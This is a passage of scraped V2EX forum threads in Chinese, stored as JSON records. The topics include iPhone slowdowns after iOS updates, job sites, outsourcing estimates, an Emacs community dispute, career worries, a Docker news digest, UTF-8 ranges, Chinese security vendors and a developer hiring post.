"如果有人希望把一台老爷机升级到最新系统，“因为新系统好啊 赶紧升啊”，那么 这个人就是个没有一般常识的外行。\r", "\r", "可惜 在手机时代这种外行成为时尚。", "iPhone 6s ， 64G ，最新版本（非 beta ）\r", "很正常啊。\r", "除了某一次自动退出之外，基本没问题啊。", "不卡怎么让你买新款呢？", "简易换安卓用 1 年之后，你就觉得 IOS 还是很好用的。", "厉害了啊\r", "\r", "安卓要是越用越卡\r", "就是 安卓系统辣鸡\r", "苹果越用越卡\r", "就是 老设备不适合新系统\r", "\r", "\r", "啧啧", " 我记得默认是不打开的，这样比较符合没有按键的 7 。 6S 可以打开，我那个古董 5C 没这个选项了，不能自动亮屏，得按两下。好像 iPad mini 2 也没，估计没指纹的没有吧。", "LZ 可以尝试下不更新最新的版本试试。肯定不卡。你在 4S 上面跑 ios10 或者 IOS7 不卡才怪。", " 这就不对了，笔记本系统从 7 升到 10 的大有人在， Android 手机阵营里，有 cm 和 mokee 之类维护的，几年前的手机用起来也还好，归根结底是优化的问题", "同感呢，新买的 iPhone 7 ，居然有时候能感觉到卡顿", "11 月买的 7 ，完全没卡过", "安卓系统的 iPhone???", "没卡过", "重启试试", "4s 都不卡！", "还是 6P iOS9.2.3 不卡呀···很流畅啊 搞的我找不到机会换它了", "6s 请用最新固件； 6 的话没办法，用 iOS9 才是基本流畅的。 iPhone 流畅不过两代，这是用了几年的感受。需要流畅就不要手贱，需要尝鲜就认命吧。", "把微信和阿里百度全家桶干掉就好了", " 你可以在设置里面设置识别指纹后直接进入桌面而不用再按一次 home 键的，之前我就对这个特别不爽，还好可以设置关掉。", " 6p 10.2.1 感觉真的挺卡的，有时卡到打字都有延迟，我真的很怀疑是系统版本号的问题。。", "iPhone5 都不卡。", "小米强，用了五年还飞快", "可是 ios 总是自动下载更新怎么办 不更新又烦", "买个 7P", "6s 表示没有压力，关掉那些通知、定位、后台运行。", "5s ， 两年多表示非常优秀", "因为系统升级了。", "6 64G IOS10 现在用起来不算卡。就是打开应用越来越慢了。打算不开始更新系统先了。软件能更新就更新。", "我的 iPhone 6 从 14 年 11 月购买到现在，一路 OTA 升级上来，而且除 OTA 升级以外，都没有什么机会重启手机，从来不卡。", "6p 和 6sp 举手", " 因为 iPhone 7 Home 键是不能按下去的啊，新系统肯定要为新设备开路", "看到这个帖子，我第一直觉是你用的是越狱的 ios 系统；第二你的 iphone 购买渠道是否来自苹果官方。\r", "从 iPhone 3GS 用到现在，从来没有觉得有什么卡顿的感觉。", "大佬， UIKit 更了几个版本了？\r", "CPU ， GPU 动辄 5X ， 10X 的升级，新硬件 0.01s ，旧硬件 0.1s 不是很正常。\r", "等到手机硬件也进入牙膏时代就不卡了。", "= =我觉得是真卡。。。以前 iPhone6 刚到手的时候微信发语音压根不需要等到，现在换成 6s 都要等一小会，不然会丢失一两秒，然后整个系统在打开了带 GPS 定位的软件并 home 退出之后依然会耗电= =iPhone 已经不是当年的 iPhone 了", "作为一个消费者，请记住你的权利，如果真的有问题，理直气壮要求 apple 售后服务，而不是别人也卡我卡就不是问题", "= =首先是不是手机储存满了，然后试试用原生的输入法", " 嗯  我感觉 5s 用 ios10 比 6s 都顺溜", "iOS 和 Android 来回转战好几回了，现在刚从 iPhone 6 (iOS 9.3.3 且已 JB)换到 Samsung Note 5 (Android 6.0.1)，感觉除了耗电控制得不好，别的都满足。\r", "\r", "现在唯一气氛的就是 QQ 和微信不按套路出牌，勿扰模式下这俩货居然还能出声。微信还好，用一个「//switchnotificationstatus 」就能变正常， QQ 却无法搞定。只能让他静音了。", "迟钝不能算卡！苹果的事儿，能算卡么？", "前年买的 5S 。。。到今年死机过几次，但是卡倒不会。。。主要是比较喜欢苹果的权限控制。", "6p 64G iOS10 也确实感觉到了越来越卡", "我的 6s 卡死了， 启动个钉钉都能卡住，经常莫名其妙掉电，难道我用了假的 iPhone ?", "我来总结一下：\r", "Android 为啥卡顿「系统优化垃圾，国产软件全家桶毒瘤，扔了换苹果」\r", "iOS 为啥卡顿「人傻怪手机！只要你 @%&￥（省略 500 字）就不卡了！我的 XX 用了 X 年都不卡！」", " \r", "可是苹果强制升级啊，而且 iOS 和 Android 的共同一点就是不升级不继续打安全补丁啊！\r", "发现部分 Android 厂商的系统会推送专门的安全补丁而不是升级。。。", "两年前的手机还想不卡……", "iOS 系统有一段代码， if year >2, then ka 。所以 2 年以上的机器就会很卡", "最近几次热更也感到不顺畅了， ios 也变成版本帝了。", "录个视频瞧瞧", "你听过。。。计划报废吗？", "android 真的不卡", " \r", "\r", "iPhone 6s 莫名其妙掉电请参看\r", "\r", " 我也是 6p 9.3.5 ，现在卡出翔了", "对于闪存而言，当快存满的时候性能有很大的下降。楼主也许是这个原因。\r", "新出的 AppleFS 不知道能不能有改善。", "确实是，从 4 一路用过来， 4s 现在都是 6.1 的系统，即使恢复系统仍然不如当初流畅了。 5 、 5s 感觉还好， 6 就比较明显。现在的 7P 感觉也不如刚拿到机子时候流畅。", " 我也知道我的 iPhone 电池在召回的范围之内。。 但是讲道理 现在 iPhone 确实越用越卡了。。 下部手机打算换个 Android 玩玩了。", "其实，很多人都搞错了，是 iOS 越用越卡，安卓好点的机器绝对不会存在越用越卡的现象", "不知你可听说过安迪比尔定律。", " 我一直没有机会对比安卓卡还是爱疯卡，因为我没有用过五千元以上的安卓手机，所以没法对比。我想大多数说安卓卡的人是用一两千块钱的安卓对比五千多块钱的 iphone 吧。", "建议用 WP", " 我 5s 升级了 beta3 很流畅\r", "我怀疑还是厨子的限制\r", "秒开应用", "我以为楼主写错了标题, 风水轮流转啊, 蛤? 基佬 Tim", " 我连 TouchID 都不用的，确切的说，我不会使用任何需要生物信息才能登录的设备，不允许任何程序或者设备获取我的生物信息，包括但不限于指纹，虹膜，脉搏，脸部特征，声音等等。", "硬件的更新与软件的更新速度不匹配，无论是苹果还是安卓，还有 PC", "正在用还行啊，不会觉得有多卡 啊，苹果系统我是不敢随便更新系统，会变成板砖的\r", "\r", "哪个都卡，看是什么原因卡了，有时候缓存过多也会卡", "果粉：“我 5000 多买的手机怎么可能会卡呢”\r", "内心：就算卡我也说不卡的", " 真相了", "楼主是要换 8 吧;-)", "ufs 的笑看你们。", "那是苹果想让你换 iPhone7 了，我的 6 也是升级 iOS10 以后就卡顿了", "7 表示不卡, 6s 卡可能是计划报废....", " 在设置里搜索 iTunes Store 与 App Store , 把第三项“更新”关掉", "你电池怎么样了？如果电池不行了的话也会这样。", "v2ex 现在的主流就是“安卓卡？=一定卡，必须卡”“苹果卡？=你买的是假苹果吧？，安卓系统的 iPhone ？”\r", "滑天下大稽", "一般来说 iPhone 搭载同时发布的系统才是最流畅的，排除手机老化的因素，随着 iOS 系统更新迭代，新系统添加了更多的功能，肯定会针对同期的 iPhone 特定优化，而是否对老机型进行过优化就不得而知了。", " 那现在公司打卡，刷脸 /指纹打卡，你咋办哦。。", " 离职，换公司。", " 或者当上总裁，这个级别都不用打卡刷脸的哈哈。。", " 基本上外企上班都不需要验指纹吧，那些办公的需要定位的 IM ，一律也不用，强制用的话就走人，换一个屋檐的事情，天不会塌。", " 其实我对这些倒不是很看重，最主要还是看薪资，只要够高，有些忍忍也就过去了，除非有 plan b", " 没用的朋友"]},
{"content": ["<div class=\"topic_content\">貌似现在新兴的招聘产品，拉勾网的使用率不是很高了。。。拉勾是不是不行了？</div>"], "reply": "109", "tittle": "拉勾现在是不是不行了？", "comment": ["拉钩一百年不匹配", "如果老是不匹配的话，大家可以想想如何让自己简历更匹配的方法。", "原来不是我一个人这样，又找回了点自信", "不看这个帖子不知道啊 我投了二十几家 就一家联系我 搞得人很没信心啊", "在拉勾投过一圈简历，搞的我都觉得离开现在的公司都找不到工作了。。。（逃", "我 16 年底用的，猎聘极度不靠谱，基本没有反馈，拉勾上基本一半以上都有反馈。", "投了 4 个简历，现在 2 星期过去了，简历状态还在 [投递成功] ", " 哥们是怎么贴上图片的？能告诉我吗？", " #108  直接用新浪图床的 URL 就可以"]},
{"content": ["<div class=\"topic_content\">楼主好歹也是过了项目相关认证的,有几年软件开发经验的老司机,虽然以前一直忍着,但今天着实不吐不快了,\r<br>\r<br>就今天一天的事情...\r<br>市场:  客户微信需求蛮简单, 尽快搞完, 评估下来约 20 人天(含加班),结果市场向领导投诉,我们的技术不给力啊...\r<br>业务:  你们页面搞完没有? 我说不是跟你们邮件讲了,框架已经建好,你们来填充内容啊, 业务说这难道不是技术自动完成的吗?你们评估和技术有问题啊...\r<br>领导: 有一项目,b2b2c+crm 接入+wms 接入+erp 接入+订制报表+各种套打,订制开发,多少钱? 一评估前端 31 个页面,后端就算 31*3 不过份吧,初步评估大概 15W+起, 领导直言开什么玩笑,客户只愿意出 2-3w, 你们行不行啊,我...WTF....\r<br>\r<br>很受伤,听听大伙儿的高见,求破...</div>"], "reply": "10", "tittle": "关于软件评估,听听大伙儿的高见,求破...", "comment": ["辞职，下一题。", "都是猪队友，还不辞职？", "外包？靠的就是开发速度赚钱啊，压榨劳动力越厉害老板越有钱", "你需要在公司里增加你的话语权，适当搞搞政治。", " 有这个打算，不过市场都这样\r", " 这道理我懂，但这样公司不赚钱啊\r", " 有入门速成的么：）", "辞职。\r", "要不然就是以个人能力整合公司开发资源，做一套代码去迎合市场上面几十家公司的需求，这样你们可以做到后续客户都只做改模板界面的事情赚钱。\r", "\r", "好一点的外包公司靠服务费生存。\r", "再差一点的靠协调其它外包公司的开发进度生存。\r", "差一点的靠模板项目微调业务代码生存。\r", "再差一点的靠改开源项目生存。\r", "以上都是有特别熟悉行业业务需求的员工或者有几个核心业务很完善的代码框架赚钱。\r", "以下都是没有核心业务的公司。\r", "好一点的根据用户需求改改从大外包公司带出来的项目框架赚钱，通常是挖几个大公司里面的员工带源码出来。可以靠短期差价赚钱，只要核心框架业务不太过时。\r", "差一点的靠能改得动开源项目的员工生存。\r", "最惨的靠接散单各种压榨员工，今天改个界面，明天写个后台。", "你可以走了", "外包都这样", " 老司机,中肯,谢谢,加分...", "外包公司就是赚个辛苦钱——你去国内外包平台上看一下就知道，同样需求 20 天 2w 块钱还有很多人在抢单的，按照你这种从零开始的评估完全没有竞争力，老板只能是靠关系和压榨程序员赚钱"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/redguardtoo/mastering-emacs-in-one-year-guide\" rel=\"nofollow\">一年成为 emacs 高手</a> 的作者 redguardtoo 在知乎问题 <a href=\"https://www.zhihu.com/question/29692328\" rel=\"nofollow\">如何评价 Emacs 的配置文件 Spacemacs ？</a> 中有 <a href=\"https://www.zhihu.com/question/29692328/answer/45325056\" rel=\"nofollow\">一条回答</a> 中提到 spacemacs 的作者 syl20bnr (Sylvain Benner) 开发 spacemacs 和 evil-tutor 的契机：</p>\n<blockquote>\n<p>“我大概有资格谈谈这个问题，因为 Sylvain Benner<strong>是受了我的激励和启发才开发了 spacemacs ”</strong></p>\n</blockquote>\n<blockquote>\n<p>“比如我在 reddit 上说 vim tutor 是入门 emacs 的捷径，他就立刻开发了 evil 的对应版本 evil-tutor ，然后通知了我。\"</p>\n</blockquote>\n<p><a href=\"https://webcache.googleusercontent.com/search?q=cache:https://www.zhihu.com/question/29692328/answer/45325056\" rel=\"nofollow\">Google Webcache</a></p>\n<p>甚是感兴趣，便查验了一下。</p>\n<ul>\n<li>evil-tutor 这个事情是这样的：\n<ul>\n<li>2015/1/1 UTC sadECEmajor 在 /r/emacs 提问 <a href=\"https://www.reddit.com/r/emacs/comments/2r1g3d/is_there_a_guide_to_evilmode_for_users_who_havent/?sort=old\" rel=\"nofollow\">Is there a guide to Evil-mode for users who haven't learned Vi?</a></li>\n<li>2015/1/2 UTC syl20bnr 开发了 <a href=\"https://github.com/syl20bnr/evil-tutor/tree/8a88214ed04bbede1490f86552a94b4044d79b44\" rel=\"nofollow\">evil-tutor</a> 并在帖子下面跟帖通知楼主(06:01:04)，并表示是受楼主启发</li>\n<li>2015/1/3 14:35:02 UTC redguardtoo 跟帖表示 vimtutor 是入门 vim 的捷径</li>\n</ul>\n</li>\n<li>关于 syl20bnr 开发 spacemacs 的契机那一条：\n<ul>\n<li><strong>没有证据证明 redguardtoo 说的这一条是谎言</strong>，也不打算向 syl20bnr 验证了（ spacemacs open 状态的 issue 太多了）</li>\n<li><a href=\"https://github.com/syl20bnr/spacemacs/search?utf8=%E2%9C%93&amp;q=redguardtoo\" rel=\"nofollow\">syl20bnr/spacemacs 仓库中关于 redguardtoo 的搜索结果</a></li>\n<li><a href=\"https://github.com/syl20bnr/spacemacs/search?q=Bin+Chen&amp;type=Commits&amp;utf8=%E2%9C%93\" rel=\"nofollow\">syl20bnr/spacemacs 仓库中关于 Bin Chen 的搜索结果</a></li>\n<li>”一年成为 emacs 高手“英文版本完成于 2014/7/1 UTC</li>\n<li>所以 syl20bnr 应该是在与 redguardtoo 在“ G+上的只言片语”中受了“激励和启发<strong>才</strong>”开发了 spacemacs</li>\n</ul>\n</li>\n</ul>\n</div></div>"], "reply": "5", "tittle": "“emacs/vim 高手”陈斌 redguardtoo 的谎言", "comment": ["城里人套路深。\r", "\r", "我就挺想吐槽什么自称 vim emacs 高手低手的。\r", "\r", "我觉得编辑器能帮助做好工作，简单好用就可以了，最后再好看一些。什么解决方案、思想、套路， excuse me ？\r", "\r", "不知道是人使用工具，还是工具把人玩了。", " +1", "吹了半天没看出来为啥 Sylvain 是受他激励的\r", "\r", "知乎有举报功能不？", "我也想吐槽下，有没有 notepad 高手的。。。。", "我可不是什么 vim 高手，我做 SpaceVim 的目的纯粹是为了让用户开箱即用，配置简单。\r", "有兴趣的可以看看\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>性价比,不知道这个词用的对不对<br>\n刚毕业的时候虽然水平很菜,但是可以说自己还是萌新,刚入行,对于很多丢人的问题可以厚着脸皮问,反正咱光脚的不怕穿鞋的,对于技术上也一直追求自身的性价比,希望自身的技术水平能大于同龄人.<br>\n到现在工作了快三年了,成长是不少(虽然还是挺弱鸡的..),但慢慢开始担心自身的能力跟不上年龄的增长,问问题的时候开始担心会不会丢人.大概再过几年,这种感受更加明显.<br>\n不知道工作 N 年的大佬们会不会这样.<br>\n有什么好的建议么?</p>\n</div></div>"], "reply": "38", "tittle": "从毕业到现在已经快三年了,开始担忧自身性价比", "comment": ["这个不用担心，每人的遭遇不同、接触的也不同，你现在想的，同龄人也会这样想，你现在担心的只有接到项目的时候能不能做到令客户满意.........", "性价比绝对不是核心竞争力", "等你到 5 年之后就不会担忧了", "什么持续学习,打好基础这些就不多说了,估计都能懂.\r", "\r", "说点实际的:\r", "1.搞点 open source/blog 之类的,质量高的多宣传一下.比如 @大 v 啥的,增加影响力.\r", "2.bat 之类的背景蛮重要的,能进去尽量进去.\r", "\r", "面向工资编程,这些还是比较靠谱的.", "手低不可怕，别眼高手低就行了，一直成长一般只是奢望，不忘初心就行。", "另外，实际点的，就是别让工作限制自己，有时间尽量维护自己的项目。", "我前段时间发现自己也快工作两年了，（做了一年 web ，现在做游戏服务端，所以又成了个新人）觉得现在貌似跟刚毕业没多大差别，突然感觉好恐惧，时间过的太快了，而我的收获好像没随着时间一直积累，这样下去，离被淘汰有多远呢。\r", "\r", "总结了下，工作这段时间其实也一直想着加深基础知识，提高写代码能力。但是太急功近利，很多凯源代码看到中途就嫌自己看太慢，或者没有集中精力去看，最后便放弃了。导致最后不仅枚多少收获，还产生了挫败感！\r", "\r", "我打算从新开始看那些收藏的代码库，一个一个集中精力击破，最后再自己写写！与楼主共勉:)", "习惯了就好了", "30 岁后再来谈困惑...", "我也 14 年毕业的，最近也是特别有这种感觉，感觉这两年半成长太少了，很慌", "跟我的处境几乎一样，我也毕业快 3 年，也感觉成长不少，但是以三年这个角度来看又感觉进步太慢了。目前这份岗位大部分的任务对我来说都没有难度，有难度的工作又因为知识面不够而一时间搞不定！\r", "\r", "去年年底重学了汇编语言，现在开始看 lua 的源码了，这两样东西在工作中不常用到，但是我希望通过这两样东西来提升自己的能力！\r", "\r", "另外，作为程序员，技术之外，业务能力也很重要，共勉！", "有女朋友了嘛，结婚啦嘛~，如果你回答是 yes ，那就够了，如果是 no ，没事大家都一样", "不忘初心是对的，设定一个需要两到三年的目标，到时候看自己完成了没有。 14 年本科毕业时我这样做了，现在实现了，觉得很有成就感、", "做自己的国王不就行了。但是又有啥用呢？我现在是这样想的，本人一生只有一个职业：学生。然后就会相对淡定了", "三年怕毛，十三年的飘过。", " 那什么才是核心竞争力？", " 木瓜", "表示刚毕业出来太渣没人要", " 滚犊子 = =", " 额不在外包公司 很多时候只是想让自己满意 哈哈~", " 这个倒是都知道 bat 很多都是去镀金 出来的都张口闭口阿里阿里的 也不是很喜欢", " 嗯 这个知道 平时也有看一些工作之外的技术栈 谢谢", " :) 很多时候我也鼓着雄心壮志在 github 看源码 很惭愧 至今没完整的看完过一个项目", " 怕那时候就晚了 想早点发现问题 早点采取措施", " 共勉 一开始从学校出来 到处招聘信息都是要求 3 年 3 年的 很希望自己也是那样的 现在真到了 3 年这个处境 却发现有了新的烦恼", " 会心一击...", " \r", " \r", "谢谢 会坚持\r", "当初选择这个行业 兴趣远大于其他", " 大哥你还写代码么", "所以所说的中年危机就是这个感觉\r", "往生命的终点望去，一眼就能望到头。", " 必须写代码啊，战斗力还很强，只是现在不打工了，自己做项目。", " 咱俩心态非常相似 共勉", "毕业的时候收入不多, 有大把时间陪孩子;\r", "三年之后反过来了, 也真是无奈.", " 自己经营公司了？厉害。", "如果写代码是唯一的竞争力的话，确实值得担忧", " 你不是已经找到工作了吗", "哈哈哈，我不明白楼主问问题要担心什么，我都工作十几年了，问起任何技术问题都不脸红~~~", "根据我非常浅薄的数学知识，把性提高点，把假降低点，性价比就高了吧。但是要避免除零崩溃", "等你干得再久一点还会遇到周围无人可问的尴尬，这就是为什么问答网站那么火"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>汇总一周容器圈热点资讯，让开发者了解最 <strong>in</strong> 的容器技术，让企业熟知最实时的国内外容器行业动态，欢迎关注。</p>\n<h2>第 5 期</h2>\n<h3>一、倾听 Docker 船长 Stefan Scherer 的故事</h3>\n<p>这次播客，我们有幸与 Docker 船长兼新崛起的微软 MVP Stefan Scherer 进行了交流。 Stefan 在 Windows Docker 和微服务方面从事了一些很棒的工作。这次谈话我们将讨论 Windows 和 Docker 该如何提升和转变工作模式， Stefan 也会为我们讲解 Docker 在 Windows 上运行的基础知识。此外，我们还将讨论：</p>\n<ul>\n<li>Stefan 热衷 Docker 的原因</li>\n<li>Stefan 在 Docker 社区最喜欢的事情</li>\n<li>Stefan 平时致力哪些有趣的项目</li>\n<li>Stefan 第一次接触 Docker 的经历</li>\n</ul>\n<p><img alt=\"\" src=\"https://i1.wp.com/blog.docker.com/wp-content/uploads/79731d3b-7579-4be3-986e-9ac8a86164e0-2.jpg?resize=331%2C331&amp;ssl=1\"></p>\n<p><a href=\"https://blog.docker.com/2017/02/dockercast-interview-docker-captain-stefan-scherer-microsoft-docker/\" rel=\"nofollow\">点击此处了解详情</a></p>\n<h3>二、 Docker containerd 对容器编排的意义</h3>\n<p>自 2016 年 4 月起 Containerd 已经成为 docker 引擎的一部分，它的主要作用是帮助用户快速启动容器。下图展示了 containerd 与 Docker 引擎融合的具体情况。 Containerd 的出现并不直接影响使用者创建和管理 Docker 容器，这对整个行业而言一个重要的里程碑。 Containerd 为将来 Docker 与容器平台之间的协作开启了大门，所有跨平台用户都将因此受益。随着容器组件的标准化，未来组件的出处也会十分有趣，可能来自 Docker 内部，也可能来自为了避免被 Docker \"劫持\" 的生态圈。总而言之，就 containerd 来说， Docker 到目前为止都有一个良好的运作。</p>\n<p><img alt=\"\" src=\"https://sweetcode.io/wp-content/uploads/2017/02/Unknown.png\"></p>\n<p><a href=\"https://sweetcode.io/docker-containerd-orchestration-services/\" rel=\"nofollow\">点击此处了解详情</a></p>\n<h3>三、大型企业与 Docker 之间存在哪些 “误会”</h3>\n<p>并非所有大型企业都使用了 Docker ，主要原因是大型企业对 Docker 还存在一些误解。</p>\n<ul>\n<li>误会一、 Docker 要么十全十美，要么一无是处</li>\n</ul>\n<p>Docker 并是一个非此即彼的命题，它的美妙之处在于容器被设计得十分轻量，即使是一个简单的 LAMP 应用程序也可以进行零碎片的迁移。</p>\n<ul>\n<li>误会二、 Docker 意味着更少的 IT 团队</li>\n</ul>\n<p>确实， Docker 等工具可以提升开发人员在整个堆栈的职责，促使他们带着发展的心态服务管理。但绝对没有理由迫使开发团队与 IT 团队合并成一个混合的部门。</p>\n<ul>\n<li>误会三、 Docker 需要依赖云</li>\n</ul>\n<p>Codeship 当然是云的忠实拥护者，但是 Docker 与平台并无关系。组织的需求才应该放在第一位的，可以阅读更多关于 Docker 如何帮助组织可靠性，奇偶校和可维护性 Codeship 。</p>\n<ul>\n<li>误解四、 Docker 安全性较弱</li>\n</ul>\n<p>一个关于 Docker 的常见的误解是，它本身是不安全的。虽然在过去可能真的是这样，但是目前类似的问题，都可以通过与裸机保护或虚拟服务器一样，采取相同的尽职调查来减少。</p>\n<p><img alt=\"\" src=\"https://sweetcode.io/wp-content/uploads/2017/02/docker13.png\"></p>\n<p><a href=\"https://sweetcode.io/docker-containerd-orchestration-services/\" rel=\"nofollow\">点击此处了解详情</a></p>\n<h3>四、存储架构二选一: hyper-convergent or hyper-scalabel</h3>\n<p>Hyper-scale 是一种在系统需求增加时，有能力进行适当扩展的架构。 Hyper-convergence 是一种基础设施系统，它以软件为中心的架构，与计算、存储、网络、虚拟化资源和其他技术紧密结合。面对两种各有千秋的存储架构，如果你是一名开发人员，寻求简单的解决方案，让你专注于代码而不是调整存储层，那么请选择 hyper-convergent 架构。如果你是一个运营商，部署应用程序到生产环境，需要一个弹性的存储层，那么请选择 hyper-scalable 架构。</p>\n<p><img alt=\"\" src=\"http://of9x2nzks.bkt.clouddn.com/17-2-26/93550551-file_1488106799512_17102.png\"></p>\n<p><a href=\"http://blog.infinit.sh/hyperconvergent-and-hyperscalable-storage-for-docker-2/\" rel=\"nofollow\">点击此处了解详情</a></p>\n<p><strong>这一期的容器圈头条就到这里，欢迎下期再会。</strong></p>\n<p><strong>作者介绍 | Evelyn</strong></p>\n<p>DaoCloud 容器技术开源团队成员，曾在 Intel DCG 部门担任 Cloud Engineering, 对分布式调度框架 Mesos 有深入学习，对集群资源管理有一定经验，目前致力于 Docker 容器技术的研究和实践。 Evelyn 所在的容器技术开源团队，在 DaoCloud 主要负责容器生态的开源工作。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Docker containerd 与容器编排；大企业和 Docker；存储架构二选一 |『道客船长的航海日志』（ 2017.02.27）", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>VIM 撸代码真的没话说。<br>\n不过如果要使用 VIM 来作为汉字的写作工具，那么你就不得不面对这模式切换+输入法切换双重折磨，蛋疼啊……</p>\n</div></div>"], "reply": "1", "tittle": "VIM 用户所不得不面对的一个难题", "comment": ["如果是用 fcitx 的话，有插件，进入 normal mode 就自动进入英文状态，再进入 insert mode 就自动进入中文状态。"]},
{"content": ["<div class=\"topic_content\">google 搜” utf-8 编码“，进中文维基百科链接\r<br>或者是这个链接： <a target=\"_blank\" href=\"https://zh.wikipedia.org/wiki/UTF-8\" rel=\"nofollow\">https://zh.wikipedia.org/wiki/UTF-8</a>\r<br>\r<br>在”描述“下，第一个表，表头 -&gt; ”代码范围-标量值-UTF-8-注释“\r<br>\r<br>最后一行 4 字节的”代码范围“，它写的是” 010000 - 10FFFF “，但我计算出来的和它右边的配图来看，应该是” 01000 - 1FFFFF “才对吧。。看它给的”标量值“对应最大也应该是 1FFFFF 才对。。</div>", "<div class=\"topic_content\">看回复说我错了弄的我有点不明不白了，不知到哪错了，我也是才看 utf-8 编码原理，求指教\r<br>google “ unicode 转 utf8\"，\r<br>第二条链接：”字符编码笔记： ASCII ， Unicode 和 UTF-8 - 阮一峰的网络日志“，他文章写的是\r<br>\"0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\"\r<br>\r<br>但第四条链接：”[字符集]Unicode 和 UTF-8 之间的转换详解- 网魂小兵- 博客园“，他文章写的是\r<br>” U-00010000 - U-001FFFFF: 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx “\r<br>\r<br>wiki 文字是\"10FFFF\"，配图是” 1FFFFF “，我计算出来的是和配图相同的\"1FFFFF\"，也和 google 第四条相同</div>", "<div class=\"topic_content\">感谢 imn1 ，弄明白了，理论是有 1FFFFF ，但 unicode 实际只用到 10FFFF\r<br>来自”百度百科“的 unicode 解释，在”方式“第一段和第四段：\r<br>” Unicode 是国际组织制定的可以容纳世界上所有文字和符号的字符编码方案。目前的 Unicode 字符分为 17 组编排， 0x0000 至 0x10FFFF ，每组称为平面（ Plane ），而每平面拥有 65536 个码位，共 1114112 个。然而目前只用了少数平面。 UTF-8 、 UTF-16 、 UTF-32 都是将数字转换到程序数据的编码方案。“\r<br>\r<br>”从 Unicode 2.0 开始， Unicode 采用了与 ISO 10646-1 相同的字库和字码； ISO 也承诺， ISO 10646 将不会替超出 U+10FFFF 的 UCS-4 编码赋值，以使得两者保持一致。两个项目仍都存在，并独立地公布各自的标准。但统一码联盟和 ISO/IEC JTC1/SC2 都同意保持两者标准的码表兼容，并紧密地共同调整任何未来的扩展。“</div>"], "reply": "8", "tittle": "刚才看中文维基百科的 utf-8 解释，有一处是不是有错误", "comment": ["如果确认，提交修改， wiki 本来就是大家一起参与维护的嘛", "是你搞错了", " 错在哪。。如果就是 10FFFF ，那配图就错了。。", " 我 ss 被确认为代理屏蔽了", "\r", " \r", "因为 unicode 的 range 就是到 10FFFF ，据我所知最新的 version 9.0 仍在这个范围内\r", "至少目前主要的相关编码方面的工具（如转码、语言、正则等等）都是按这个标准的\r", "那个图片只是说了构造方法，已经远超出 unicode 的 range 了", " 感谢，明白了，原来是实际应用最大是 10FFFFF", " #4 sni 代理不会屏蔽"]},
{"content": ["<div class=\"topic_content\">RT 。。。。 只是作为一个了解国内目前整个做安全相关的现状的提问</div>"], "reply": "20", "tittle": "目前国内做互联网安全的公司有哪些？分别有哪些知名的安全产品？", "comment": ["整理了一些，不太完整\r", "华为、启明星辰、深信服、绿盟、奇虎 360 、亚信、卫士通、天融信、华三、安恒信息、美亚柏科、山石网科、北信源、知道创宇、安天实验室、梆梆安全、通付盾、恒安嘉新、飞天诚信、网康、蓝盾、立思辰、匡恩、同盾、通普科技、东软、任子行、永信至诚、明朝万达、瑞星、众人科技、海泰方圆、安赛科技、鼎普科技、椒图科技、安华金和、安全狗\r", "\r", "至于产品，很多家都是产品重合\r", "利益相关：某安全厂商员工，不评价公司和产品好坏", " 1fd620hs89sj22t91j2e81", "帮楼上补图\r", " 1fd620hs89sj22t91j2e81", "噗···再来\r", " 多年未关注前东家 linktrust 已经关门倒闭了吗？", "围观，从事安全相关的公司真不少！", " 写的不完整，这里只是列出了一部分", "除了百度腾讯 360 ，其他的行业公司都还算是正经的吧，但这三家太不正经，都是广告公司。", " 360 都不正经瑞星叫正经么？", " 说到广告公司, 我现在只服金山, 从去年开始全产品线开始藏心病狂满屏广告, 完全不顾用户感受, 杀鸡取卵", " 杭州安恒信息技术有限公司", " 图不错，不知道这个图是什么时间统计的", " 这么一看，还真不少", " \r", "安全牛官网的  ， here ->\r", "\r", "能看到这个么？", "斯诺登事件后，安全届迎来春天", "还有各地的安全测评中心", "火绒", "国内这些软件几乎都是全家桶 广告接收客户端", " 其中有一半是 Nessus 。。。。"]},
{"content": ["<div class=\"topic_content\">我们想做一个深圳的本地社区\r<br>\r<br>先发需求：\r<br><a target=\"_blank\" href=\"https://shimo.im/doc/mcE2xwTSQR0D7XYf/%E3%80%8C\" rel=\"nofollow\">https://shimo.im/doc/mcE2xwTSQR0D7XYf/「</a> Step1 」\r<br><a target=\"_blank\" href=\"https://shimo.im/doc/GQwpSDGz6OoWuXTD/%E3%80%8C\" rel=\"nofollow\">https://shimo.im/doc/GQwpSDGz6OoWuXTD/「</a> Step2 」\r<br><a target=\"_blank\" href=\"https://shimo.im/doc/HbKJAwHL3OoOkXmV/%E3%80%8C\" rel=\"nofollow\">https://shimo.im/doc/HbKJAwHL3OoOkXmV/「</a> Step3 」\r<br>\r<br>要求就三点：\r<br>1 、技术过硬（我们的需求不难，但跟合格的码农合作绝对是一件快事）\r<br>2 、每天能够保持 4 小时左右的开发时间，产品经理随时待命等候你差犬\r<br>3 、拒绝专业的外包公司，那种质量你懂得，人最好在深圳（方便沟通）\r<br>\r<br>有兴趣把个人简介、作品等能够证明你靠谱的资料发到我的邮箱： <a target=\"_blank\" href=\"mailto:com2con@gmail.com\">com2con@gmail.com</a> ，可以的话顺便发下报价跟开发时间，合则约见，谢谢。</div>"], "reply": "13", "tittle": "Android 二次开发，就不能来个靠谱点的吗。。。", "comment": ["我可以保证时间，可惜不在深圳", " 你在哪里？如果各方面都 OK 的话不在深圳也可以吧", "二次开发？ 项目重构咯？", " 不算，只是调整一下界面＋新增一些页面", "您好邮件已发，有兴趣可以联系。", "差犬是网络用语吗？\r", "还是差遣打错了？", " \r", "\r", "柴犬  :doge:", " 确实是打错了。。。我以为是 Chai Quan😄", " 你不说我还觉得这词非常准呢 😄", " 上海或者湖北，地点不固定 。", " 邮件已发", "终于看见这么详细的需求文档了，泪奔。。。", "  邮件已发"]},
{"content": "", "reply": "2", "tittle": "杭州目前开始春招实习生的公司有哪些？", "comment": ["阿里妈妈开始内推了", " 除了阿里呢。。"]},
